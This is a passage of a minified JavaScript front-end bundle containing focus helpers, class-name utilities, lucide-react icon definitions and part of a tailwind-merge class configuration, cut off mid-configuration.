var nc = (e, t, n = 0) => {
    const r = Math.abs(e.x),
        o = Math.abs(e.y),
        i = r > o;
    return t === "left" || t === "right" ? i && r > n : !i && o > n
};

function hg(e = () => {}) {
    const t = Pt(e);
    gi(() => {
        let n = 0,
            r = 0;
        return n = window.requestAnimationFrame(() => r = window.requestAnimationFrame(t)), () => {
            window.cancelAnimationFrame(n), window.cancelAnimationFrame(r)
        }
    }, [t])
}

function mg(e) {
    return e.nodeType === e.ELEMENT_NODE
}

function yg(e) {
    const t = [],
        n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
            acceptNode: r => {
                const o = r.tagName === "INPUT" && r.type === "hidden";
                return r.disabled || r.hidden || o ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
            }
        });
    for (; n.nextNode();) t.push(n.currentNode);
    return t
}

function Es(e) {
    const t = document.activeElement;
    return e.some(n => n === t ? !0 : (n.focus(), document.activeElement !== t))
}
var vg = up,
    xp = cp,
    Sp = fp,
    kp = pp,
    Ep = hp,
    Cp = yp,
    Pp = Tu;

function Np(e) {
    var t, n, r = "";
    if (typeof e == "string" || typeof e == "number") r += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var o = e.length;
            for (t = 0; t < o; t++) e[t] && (n = Np(e[t])) && (r && (r += " "), r += n)
        } else
            for (n in e) e[n] && (r && (r += " "), r += n);
    return r
}

function Tp() {
    for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++)(e = arguments[n]) && (t = Np(e)) && (r && (r += " "), r += t);
    return r
}
const rc = e => typeof e == "boolean" ? `${e}` : e === 0 ? "0" : e,
    oc = Tp,
    _u = (e, t) => n => {
        var r;
        if ((t == null ? void 0 : t.variants) == null) return oc(e, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
        const {
            variants: o,
            defaultVariants: i
        } = t, s = Object.keys(o).map(a => {
            const p = n == null ? void 0 : n[a],
                m = i == null ? void 0 : i[a];
            if (p === null) return null;
            const h = rc(p) || rc(m);
            return o[a][h]
        }), l = n && Object.entries(n).reduce((a, p) => {
            let [m, h] = p;
            return h === void 0 || (a[m] = h), a
        }, {}), u = t == null || (r = t.compoundVariants) === null || r === void 0 ? void 0 : r.reduce((a, p) => {
            let {
                class: m,
                className: h,
                ...w
            } = p;
            return Object.entries(w).every(k => {
                let [v, S] = k;
                return Array.isArray(S) ? S.includes({ ...i,
                    ...l
                }[v]) : { ...i,
                    ...l
                }[v] === S
            }) ? [...a, m, h] : a
        }, []);
        return oc(e, s, u, n == null ? void 0 : n.class, n == null ? void 0 : n.className)
    };
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const gg = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
    _p = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var wg = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xg = g.forwardRef(({
    color: e = "currentColor",
    size: t = 24,
    strokeWidth: n = 2,
    absoluteStrokeWidth: r,
    className: o = "",
    children: i,
    iconNode: s,
    ...l
}, u) => g.createElement("svg", {
    ref: u,
    ...wg,
    width: t,
    height: t,
    stroke: e,
    strokeWidth: r ? Number(n) * 24 / Number(t) : n,
    className: _p("lucide", o),
    ...l
}, [...s.map(([a, p]) => g.createElement(a, p)), ...Array.isArray(i) ? i : [i]]));
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Tt = (e, t) => {
    const n = g.forwardRef(({
        className: r,
        ...o
    }, i) => g.createElement(xg, {
        ref: i,
        iconNode: t,
        className: _p(`lucide-${gg(e)}`, r),
        ...o
    }));
    return n.displayName = `${e}`, n
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Rp = Tt("CircleAlert", [
    ["circle", {
        cx: "12",
        cy: "12",
        r: "10",
        key: "1mglay"
    }],
    ["line", {
        x1: "12",
        x2: "12",
        y1: "8",
        y2: "12",
        key: "1pkeuh"
    }],
    ["line", {
        x1: "12",
        x2: "12.01",
        y1: "16",
        y2: "16",
        key: "4dfq90"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Sg = Tt("CircleCheckBig", [
    ["path", {
        d: "M21.801 10A10 10 0 1 1 17 3.335",
        key: "yps3ct"
    }],
    ["path", {
        d: "m9 11 3 3L22 4",
        key: "1pflzl"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Cs = Tt("Link", [
    ["path", {
        d: "M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71",
        key: "1cjeqo"
    }],
    ["path", {
        d: "M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71",
        key: "19qd67"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const jp = Tt("LoaderCircle", [
    ["path", {
        d: "M21 12a9 9 0 1 1-6.219-8.56",
        key: "13zald"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ic = Tt("Play", [
    ["polygon", {
        points: "6 3 20 12 6 21 6 3",
        key: "1oa8hb"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const kg = Tt("RotateCcw", [
    ["path", {
        d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",
        key: "1357e3"
    }],
    ["path", {
        d: "M3 3v5h5",
        key: "1xhq8a"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Eg = Tt("Shield", [
    ["path", {
        d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
        key: "oel41y"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Cg = Tt("Webhook", [
    ["path", {
        d: "M18 16.98h-5.99c-1.1 0-1.95.94-2.48 1.9A4 4 0 0 1 2 17c.01-.7.2-1.4.57-2",
        key: "q3hayz"
    }],
    ["path", {
        d: "m6 17 3.13-5.78c.53-.97.1-2.18-.5-3.1a4 4 0 1 1 6.89-4.06",
        key: "1go1hn"
    }],
    ["path", {
        d: "m12 6 3.13 5.73C15.66 12.7 16.9 13 18 13a4 4 0 0 1 0 8",
        key: "qlwsc0"
    }]
]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Op = Tt("X", [
        ["path", {
            d: "M18 6 6 18",
            key: "1bl5f8"
        }],
        ["path", {
            d: "m6 6 12 12",
            key: "d8bk6v"
        }]
    ]),
    Ru = "-",
    Pg = e => {
        const t = Tg(e),
            {
                conflictingClassGroups: n,
                conflictingClassGroupModifiers: r
            } = e;
        return {
            getClassGroupId: s => {
                const l = s.split(Ru);
                return l[0] === "" && l.length !== 1 && l.shift(), Lp(l, t) || Ng(s)
            },
            getConflictingClassGroupIds: (s, l) => {
                const u = n[s] || [];
                return l && r[s] ? [...u, ...r[s]] : u
            }
        }
    },
    Lp = (e, t) => {
        var s;
        if (e.length === 0) return t.classGroupId;
        const n = e[0],
            r = t.nextPart.get(n),
            o = r ? Lp(e.slice(1), r) : void 0;
        if (o) return o;
        if (t.validators.length === 0) return;
        const i = e.join(Ru);
        return (s = t.validators.find(({
            validator: l
        }) => l(i))) == null ? void 0 : s.classGroupId
    },
    sc = /^\[(.+)\]$/,
    Ng = e => {
        if (sc.test(e)) {
            const t = sc.exec(e)[1],
                n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
            if (n) return "arbitrary.." + n
        }
    },
    Tg = e => {
        const {
            theme: t,
            prefix: n
        } = e, r = {
            nextPart: new Map,
            validators: []
        };
        return Rg(Object.entries(e.classGroups), n).forEach(([i, s]) => {
            Cl(s, r, i, t)
        }), r
    },
    Cl = (e, t, n, r) => {
        e.forEach(o => {
            if (typeof o == "string") {
                const i = o === "" ? t : lc(t, o);
                i.classGroupId = n;
                return
            }
            if (typeof o == "function") {
                if (_g(o)) {
                    Cl(o(r), t, n, r);
                    return
                }
                t.validators.push({
                    validator: o,
                    classGroupId: n
                });
                return
            }
            Object.entries(o).forEach(([i, s]) => {
                Cl(s, lc(t, i), n, r)
            })
        })
    },
    lc = (e, t) => {
        let n = e;
        return t.split(Ru).forEach(r => {
            n.nextPart.has(r) || n.nextPart.set(r, {
                nextPart: new Map,
                validators: []
            }), n = n.nextPart.get(r)
        }), n
    },
    _g = e => e.isThemeGetter,
    Rg = (e, t) => t ? e.map(([n, r]) => {
        const o = r.map(i => typeof i == "string" ? t + i : typeof i == "object" ? Object.fromEntries(Object.entries(i).map(([s, l]) => [t + s, l])) : i);
        return [n, o]
    }) : e,
    jg = e => {
        if (e < 1) return {
            get: () => {},
            set: () => {}
        };
        let t = 0,
            n = new Map,
            r = new Map;
        const o = (i, s) => {
            n.set(i, s), t++, t > e && (t = 0, r = n, n = new Map)
        };
        return {
            get(i) {
                let s = n.get(i);
                if (s !== void 0) return s;
                if ((s = r.get(i)) !== void 0) return o(i, s), s
            },
            set(i, s) {
                n.has(i) ? n.set(i, s) : o(i, s)
            }
        }
    },
    Mp = "!",
    Og = e => {
        const {
            separator: t,
            experimentalParseClassName: n
        } = e, r = t.length === 1, o = t[0], i = t.length, s = l => {
            const u = [];
            let a = 0,
                p = 0,
                m;
            for (let S = 0; S < l.length; S++) {
                let d = l[S];
                if (a === 0) {
                    if (d === o && (r || l.slice(S, S + i) === t)) {
                        u.push(l.slice(p, S)), p = S + i;
                        continue
                    }
                    if (d === "/") {
                        m = S;
                        continue
                    }
                }
                d === "[" ? a++ : d === "]" && a--
            }
            const h = u.length === 0 ? l : l.substring(p),
                w = h.startsWith(Mp),
                k = w ? h.substring(1) : h,
                v = m && m > p ? m - p : void 0;
            return {
                modifiers: u,
                hasImportantModifier: w,
                baseClassName: k,
                maybePostfixModifierPosition: v
            }
        };
        return n ? l => n({
            className: l,
            parseClassName: s
        }) : s
    },
    Lg = e => {
        if (e.length <= 1) return e;
        const t = [];
        let n = [];
        return e.forEach(r => {
            r[0] === "[" ? (t.push(...n.sort(), r), n = []) : n.push(r)
        }), t.push(...n.sort()), t
    },
    Mg = e => ({
        cache: jg(e.cacheSize),
        parseClassName: Og(e),
        ...Pg(e)
    }),
    Ig = /\s+/,
    Dg = (e, t) => {
        const {
            parseClassName: n,
            getClassGroupId: r,
            getConflictingClassGroupIds: o
        } = t, i = [], s = e.trim().split(Ig);
        let l = "";
        for (let u = s.length - 1; u >= 0; u -= 1) {
            const a = s[u],
                {
                    modifiers: p,
                    hasImportantModifier: m,
                    baseClassName: h,
                    maybePostfixModifierPosition: w
                } = n(a);
            let k = !!w,
                v = r(k ? h.substring(0, w) : h);
            if (!v) {
                if (!k) {
                    l = a + (l.length > 0 ? " " + l : l);
                    continue
                }
                if (v = r(h), !v) {
                    l = a + (l.length > 0 ? " " + l : l);
                    continue
                }
                k = !1
            }
            const S = Lg(p).join(":"),
                d = m ? S + Mp : S,
                c = d + v;
            if (i.includes(c)) continue;
            i.push(c);
            const f = o(v, k);
            for (let x = 0; x < f.length; ++x) {
                const C = f[x];
                i.push(d + C)
            }
            l = a + (l.length > 0 ? " " + l : l)
        }
        return l
    };

function Fg() {
    let e = 0,
        t, n, r = "";
    for (; e < arguments.length;)(t = arguments[e++]) && (n = Ip(t)) && (r && (r += " "), r += n);
    return r
}
const Ip = e => {
    if (typeof e == "string") return e;
    let t, n = "";
    for (let r = 0; r < e.length; r++) e[r] && (t = Ip(e[r])) && (n && (n += " "), n += t);
    return n
};

function Ag(e, ...t) {
    let n, r, o, i = s;

    function s(u) {
        const a = t.reduce((p, m) => m(p), e());
        return n = Mg(a), r = n.cache.get, o = n.cache.set, i = l, l(u)
    }

    function l(u) {
        const a = r(u);
        if (a) return a;
        const p = Dg(u, n);
        return o(u, p), p
    }
    return function() {
        return i(Fg.apply(null, arguments))
    }
}
const Q = e => {
        const t = n => n[e] || [];
        return t.isThemeGetter = !0, t
    },
    Dp = /^\[(?:([a-z-]+):)?(.+)\]$/i,
    zg = /^\d+\/\d+$/,
    bg = new Set(["px", "full", "screen"]),
    Ug = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
    $g = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
    Vg = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
    Wg = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
    Bg = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,
    ht = e => Wn(e) || bg.has(e) || zg.test(e),
    Rt = e => cr(e, "length", Zg),
    Wn = e => !!e && !Number.isNaN(Number(e)),
    Ps = e => cr(e, "number", Wn),
    wr = e => !!e && Number.isInteger(Number(e)),
    Qg = e => e.endsWith("%") && Wn(e.slice(0, -1)),
    F = e => Dp.test(e),
    jt = e => Ug.test(e),
    Hg = new Set(["length", "size", "percentage"]),
    Kg = e => cr(e, Hg, Fp),
    Gg = e => cr(e, "position", Fp),
    qg = new Set(["image", "url"]),
    Yg = e => cr(e, qg, e0),
    Xg = e => cr(e, "", Jg),
    xr = () => !0,
    cr = (e, t, n) => {
        const r = Dp.exec(e);
        return r ? r[1] ? typeof t == "string" ? r[1] === t : t.has(r[1]) : n(r[2]) : !1
    },
    Zg = e => $g.test(e) && !Vg.test(e),
    Fp = () => !1,
    Jg = e => Wg.test(e),
    e0 = e => Bg.test(e),
    t0 = () => {
        const e = Q("colors"),
            t = Q("spacing"),
            n = Q("blur"),
            r = Q("brightness"),
            o = Q("borderColor"),
            i = Q("borderRadius"),
            s = Q("borderSpacing"),
            l = Q("borderWidth"),
            u = Q("contrast"),
            a = Q("grayscale"),
            p = Q("hueRotate"),
            m = Q("invert"),
            h = Q("gap"),
            w = Q("gradientColorStops"),
            k = Q("gradientColorStopPositions"),
            v = Q("inset"),
            S = Q("margin"),
            d = Q("opacity"),
            c = Q("padding"),
            f = Q("saturate"),
            x = Q("scale"),
            C = Q("sepia"),
            P = Q("skew"),
            N = Q("space"),
            _ = Q("translate"),
            M = () => ["auto", "contain", "none"],
            L = () => ["auto", "hidden", "clip", "visible", "scroll"],
            Z = () => ["auto", F, t],
            z = () => [F, t],
            Oe = () => ["", ht, Rt],
            I = () => ["auto", Wn, F],
            ue = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"],
            ae = () => ["solid", "dashed", "dotted", "double", "none"],
            Ue = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"],
            R = () => ["start", "end", "center", "between", "around", "evenly", "stretch"],
            O = () => ["", "0", F],
            D = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"],
            U = () => [Wn, F];
        return {
            cacheSize: 500,
            separator: ":",
            theme: {
                colors: [xr],
                spacing: [ht, Rt],
                blur: ["none", "", jt, F],
                brightness: U(),
                borderColor: [e],
                borderRadius: ["none", "", "full", jt, F],
                borderSpacing: z(),
                borderWidth: Oe(),
                contrast: U(),
                grayscale: O(),
                hueRotate: U(),
                invert: O(),
                gap: z(),
                gradientColorStops: [e],
                gradientColorStopPositions: [Qg, Rt],
                inset: Z(),
                margin: Z(),
                opacity: U(),
                padding: z(),
                saturate: U(),
                scale: U(),
                sepia: O(),
                skew: U(),
                space: z(),
                translate: z()
            },
            classGroups: {
                aspect: [{
                    aspect: ["auto", "square", "video", F]
                }],
                container: ["container"],
                columns: [{
                    columns: [jt]
                }],
                "break-after": [{
                    "break-after": D()
                }],
                "break-before": [{
                    "break-before": D()
                }],
                "break-inside": [{
                    "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
                }],
                "box-decoration": [{
                    "box-decoration": ["slice", "clone"]
                }],
                box: [{
                    box: ["border", "content"]
                }],
                display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
                float: [{
                    float: ["right", "left", "none", "start", "end"]
                }],
                clear: [{
                    clear: ["left", "right", "both", "none", "start", "end"]
                }],
                isolation: ["isolate", "isolation-auto"],
                "object-fit": [{
                    object: ["contain", "cover", "fill", "none", "scale-down"]
                }],
                "object-position": [{
                    object: [...ue(), F]
                }],
                overflow: [{
                    overflow: L()
                }],
                "overflow-x": [{
                    "overflow-x": L()
                }],
                "overflow-y": [{
                    "overflow-y": L()
                }],
                overscroll: [{
                    overscroll: M()
                }],
                "overscroll-x": [{
                    "overscroll-x": M()
                }],
                "overscroll-y": [{
                    "overscroll-y": M()
                }],
                position: ["static", "fixed", "absolute", "relative", "sticky"],
                inset: [{
                    inset: [v]
                }],
                "inset-x": [{
                    "inset-x": [v]
                }],
                "inset-y": [{
                    "inset-y": [v]
                }],
                start: [{
                    start: [v]
                }],
                end: [{
                    end: [v]
                }],
                top: [{
                    top: [v]
                }],
                right: [{
                    right: [v]
                }],
                bottom: [{
                    bottom: [v]
                }],
                left: [{
                    left: [v]
                }],
                visibility: ["visible", "invisible", "collapse"],
                z: [{
                    z: ["auto", wr, F]
                }],
                basis: [{
                    basis: Z()
                }],
                "flex-direction": [{
                    flex: ["row", "row-reverse", "col", "col-reverse"]
                }],
                "flex-wrap": [{
                    flex: ["wrap", "wrap-reverse", "nowrap"]
                }],
                flex: [{
                    flex: ["1", "auto", "initial", "none", F]
                }],
                grow: [{
                    grow: O()
                }],
                shrink: [{
                    shrink: O()
                }],
                order: [{
                    order: ["first", "last", "none", wr, F]
                }],
                "grid-cols": [{
                    "grid-cols": [xr]
                }],
                "col-start-end": [{
                    col: ["auto", {
                        span: ["full", wr, F]
                    }, F]
                }],
                "col-start": [{
                    "col-start": I()
                }],
                "col-end": [{
                    "col-end": I()
                }],
                "grid-rows": [{
                    "grid-rows": [xr]
                }],
                "row-start-end": [{
                    row: ["auto", {
                        span: [wr, F]
                    }, F]
                }],
                "row-start": [{
                    "row-start": I()
                }],
                "row-end": [{
                    "row-end": I()
                }],
                "grid-flow": [{
                    "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
                }],
                "auto-cols": [{
                    "auto-cols": ["auto", "min", "max", "fr", F]
                }],
                "auto-rows": [{
                    "auto-rows": ["auto", "min", "max", "fr", F]
                }],
                gap: [{
                    gap: [h]
                }],
                "gap-x": [{
                    "gap-x": [h]
                }],
                "gap-y": [{
                    "gap-y": [h]
                }],
                "justify-content": [{
                    justify: ["normal", ...R()]
                }],
                "justify-items": [{
                    "justify-items": ["start", "end", "center", "stretch"]
                }],
                "justify-self": [{
                    "justify-self": ["auto", "start", "end", "center", "stretch"]
                }],
                "align-content": [{
                    content: ["normal", ...R(), "baseline"]
                }],
                "align-items": [{
                    items: ["start", "end", "center", "baseline", "stretch"]
                }],
                "align-self": [{
                    self: ["auto", "start", "end", "center", "stretch", "baseline"]
                }],
                "place-content": [{
                    "place-content": [...R(), "baseline"]
                }],
                "place-items": [{
                    "place-items": ["start", "end", "center", "baseline", "stretch"]
                }],
                "place-self": [{
                    "place-self": ["auto", "start", "end", "center", "stretch"]
                }],
                p: [{
                    p: [c]
                }],
                px: [{
                    px: [c]
                }],
                py: [{
                    py: [c]
                }],
                ps: [{
                    ps: [c]
                }],
                pe: [{
                    pe: [c]
                }],
                pt: [{
                    pt: [c]
                }],
                pr: [{
                    pr: [c]
                }],
                pb: [{
                    pb: [c]
                }],
                pl: [{
                    pl: [c]
                }],
                m: [{
                    m: [S]
                }],
                mx: [{
                    mx: [S]
                }],
                my: [{
                    my: [S]
                }],
                ms: [{
                    ms: [S]
                }],
                me: [{
                    me: [S]
                }],
                mt: [{
                    mt: [S]
                }],
                mr: [{
                    mr: [S]
                }],
                mb: [{
                    mb: [S]
                }],
                ml: [{
                    ml: [S]
                }],
                "space-x": [{
                    "space-x": [N]
                }],
                "space-x-reverse": ["space-x-reverse"],
                "space-y": [{
                    "space-y": [N]
                }],
                "space-y-reverse": ["space-y-reverse"],
                w: [{
                    w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", F, t]
                }],
                "min-w": [{
                    "min-w": [F, t, "min", "max", "fit"]
                }],
                "max-w": [{
                    "max-w": [F, t, "none", "full", "min", "max", "fit", "prose", {
                        screen: [jt]
                    }, jt]
                }],
                h: [{
                    h: [F, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
                }],
                "min-h": [{
                    "min-h": [F, t, "min", "max", "fit", "svh", "lvh", "dvh"]
                }],
                "max-h": [{
                    "max-h": [F, t, "min", "max", "fit", "svh", "lvh", "dvh"]
                }],
                size: [{
                    size: [F, t, "auto", "min", "max", "fit"]
                }],
                "font-size": [{
                    text: ["base", jt, Rt]
                }],
                "font-smoothing": ["antialiased", "subpixel-antialiased"],
                "font-style": ["italic", "not-italic"],
                "font-weight": [{
                    font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", Ps]
                }],
                "font-family": [{
                    font: [xr]
                }],
                "fvn-normal": ["normal-nums"],
                "fvn-ordinal": ["ordinal"],
                "fvn-slashed-zero": ["slashed-zero"],
                "fvn-figure": ["lining-nums", "oldstyle-nums"],
                "fvn-spacing": ["proportional-nums", "tabular-nums"],
                "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
                tracking: [{
                    tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", F]
                }],
                "line-clamp": [{
                    "line-clamp": ["none", Wn, Ps]
                }],
                leading: [{
                    leading: ["none", "tight", "snug", "normal", "relaxed", "loose", ht, F]
                }],
                "list-image": [{
                    "list-image": ["none", F]
                }],
                "list-style-type": [{
                    list: ["none", "disc", "decimal", F]
                }],
                "list-style-position": [{
                    list: ["inside", "outside"]
                }],
                "placeholder-color": [{
                    placeholder: [e]
                }],
                "placeholder-opacity": [{
                    "placeholder-opacity": [d]
                }],
                "text-alignment": [{
                    text: ["left", "center", "right", "justify", "start", "end"]
                }],
                "text-color": [{
                    text: [e]
                }],
                "text-opacity": [{
                    "text-opacity": [d]
                }],
                "text-decoration": ["underline", "overline", "line-through", "no-underline"],
                "text-decoration-style": [{
                    decoration: [...ae(), "wavy"]
                }],
                "text-decoration-thickness": [{
                    decoration: ["auto", "from-font", ht, Rt]
                }],
                "underline-offset": [{
                    "underline-offset": ["auto", ht, F]
                }],
                "text-decoration-color": [{
                    decoration: [e]
                }],
                "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
                "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
                "text-wrap": [{
                    text: ["wrap", "nowrap", "balance", "pretty"]
                }],
                indent: [{
                    indent: z()
                }],
                "vertical-align": [{
                    align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", F]
                }],
                whitespace: [{
                    whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
                }],
                break: [{
                    break: ["normal", "words", "all", "keep"]
                }],
                hyphens: [{
                    hyphens: ["none", "manual", "auto"]
                }],
                content: [{
                    content: ["none", F]
                }],
                "bg-attachment": [{
                    bg: ["fixed", "local", "scroll"]
                }],
                "bg-clip": [{
                    "bg-clip": ["border", "padding", "content", "text"]
                }],
                "bg-opacity": [{
                    "bg-opacity": [d]
                }],
                "bg-origin": [{
                    "bg-origin": ["border", "padding", "content"]
                }],
                "bg-position": [{
                    bg: [...ue(), Gg]
                }],
                "bg-repeat": [{
                    bg: ["no-repeat", {
                        repeat: ["", "x", "y", "round", "space"]
                    }]
                }],
                "bg-size": [{
                    bg: ["auto", "cover", "contain", Kg]
                }],
                "bg-image": [{
                    bg: ["none", {
                        "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                    }, Yg]
                }],
                "bg-color": [{
                    bg: [e]
                }],
                "gradient-from-pos": [{
                    from: [k]
                }],
                "gradient-via-pos": [{
                    via: [k]
                }],
                "gradient-to-pos": [{
                    to: [k]
                }],
                "gradient-from": [{
                    from: [w]
                }],
                "gradient-via": [{
                    via: [w]
                }],
                "gradient-to": [{
                    to: [w]
                }],
                rounded: [{
                    rounded: [i]
                }],
                "rounded-s": [{
                    "rounded-s": [i]
                }],
                "rounded-e": [{
                    "rounded-e": [i]
                }],
                "rounded-t": [{
                    "rounded-t": [i]
                }],
                "rounded-r": [{
                    "rounded-r": [i]
                }],
                "rounded-b": [{
                    "rounded-b": [i]
                }],
                "rounded-l": [{
                    "rounded-l": [i]
                }],
                "rounded-ss": [{
                    "rounded-ss": [i]
                }],
                "rounded-se": [{
                    "rounded-se": [i]
                }],
                "rounded-ee": [{
                    "rounded-ee": [i]
                }],
                "rounded-es": [{
                    "rounded-es": [i]
                }],
                "rounded-tl": [{
                    "rounded-tl": [i]
                }],
                "rounded-tr": [{
                    "rounded-tr": [i]
                }],
                "rounded-br": [{
                    "rounded-br": [i]
                }],
                "rounded-bl": [{
                    "rounded-bl": [i]
                }],
                "border-w": [{
                    border: [l]
                }],
                "border-w-x": [{
                    "border-x": [l]
                }],
                "border-w-y": [{
                    "border-y": [l]
                }],
                "border-w-s": [{
                    "border-s": [l]
                }],
                "border-w-e": [{
                    "border-e": [l]
                }],
                "border-w-t": [{
                    "border-t": [l]
                }],
                "border-w-r": [{
                    "border-r": [l]
                }],
                "border-w-b": [{
                    "border-b": [l]
                }],
                "border-w-l": [{
                    "border-l": [l]
                }],
                "border-opacity": [{
                    "border-opacity": [d]
                }],
                "border-style": [{
                    border: [...ae(), "hidden"]
                }],
                "divide-x": [{
                    "divide-x": [l]
                }],
                "divide-x-reverse": ["divide-x-reverse"],
                "divide-y": [{
                    "divide-y": [l]
                }],
                "divide-y-reverse": ["divide-y-reverse"],
                "divide-opacity": [{
                    "divide-opacity": [d]
                }],
                "divide-style": [{
                    divide: ae()
                }],
                "border-color": [{
                    border: [o]
                }],
                "border-color-x": [{
                    "border-x": [o]
                }],
                "border-color-y": [{
                    "border-y": [o]
                }],
                "border-color-s": [{
                    "border-s": [o]
                }],
                "border-color-e": [{
                    "border-e": [o]
                }],
                "border-color-t": [{
                    "border-t": [o]
                }],
                "border-color-r": [{
                    "border-r": [o]
                }],
                "border-color-b": [{
                    "border-b": [o]
                }],
                "border-color-l": [{
                    "border-l": [o]
                }],
                "divide-color": [{
                    divide: [o]
                }],
                "outline-style": [{
                    outline: ["", ...ae()]
                }],
                "outline-offset": [{
                    "outline-offset": [ht, F]
                }],
                "outline-w": [{
                    outline: [ht, Rt]
                }],
                "outline-color": [{
                    outline: [e]
                }],
                "ring-w": [{
                    ring: Oe()
                }],
                "ring-w-inset": ["ring-inset"],
                "ring-color": [{
                    ring: [e]
                }],
                "ring-opacity": [{
                    "ring-opacity": [d]
                }],
                "ring-offset-w": [{
                    "ring-offset": [ht, Rt]
                }],
                "ring-offset-color": [{
                    "ring-offset": [e]
                }],
                shadow: [{
                    shadow: ["", "inner", "none", jt, Xg]
                }],
                "shadow-color": [{
                    shadow: [xr]
                }],
                opacity: [{
                    opacity: [d]
                }],
                "mix-blend": [{
                    "mix-blend": [...Ue(), "plus-lighter", "plus-darker"]
                }],
                "bg-blend": [{
                    "bg-blend": Ue()
                }],
                filter: [{
                    filter: ["", "none"]
                }],
                blur: [{
                    blur: [n]
                }],
                brightness: [{
                    brightness: [r]
                }],
                contrast: [{
                    contrast: [u]
                }],
                "drop-shadow": [{
                    "drop-shadow": ["", "none", jt, F]
                }],
                grayscale: [{
                    grayscale: [a]
                }],
                "hue-rotate": [{
                    "hue-rotate": [p]
                }],
                invert: [{
                    invert: [m]
                }],
                saturate: [{
                    saturate: [f]
                }],
                sepia: [{
                    sepia: [C]
                }],
                "backdrop-filter": [{
                    "backdrop-filter": ["", "none"]
                }],
                "backdrop-blur": [{
                    "backdrop-blur": [n]
                }],
                "backdrop-brightness": [{
                    "backdrop-brightness": [r]
                }],
                "backdrop-contrast": [{
                    "backdrop-contrast": [u]
                }],
                "backdrop-grayscale": [{
                    "backdrop-grayscale": [a]
                }],
